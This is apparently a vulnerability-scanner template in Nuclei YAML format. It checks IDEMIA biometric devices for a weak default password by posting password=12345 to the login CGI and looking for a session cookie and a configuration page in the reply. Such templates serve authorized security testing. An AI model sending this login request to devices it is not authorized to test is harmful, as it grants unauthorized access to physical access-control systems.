id: idemia-biometrics-weak-password
info:
  name: IDEMIA Biometrics Weak Password Vulnerability
  author: ProjectDiscoveryAI
  severity: high
  tags: weak-password
http:
  - raw:
      - |
        POST /cgi-bin/login.cgi HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        password=12345
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: regex
        regex:
          - "document\\.cookie =\\\"session_id=([0-9a-zA-Z]+);"
      - type: word
        words:
          - "MA5G_general_configurations.htm"
      - type: word
        words:
          - "Invalid Password"
        negative: true
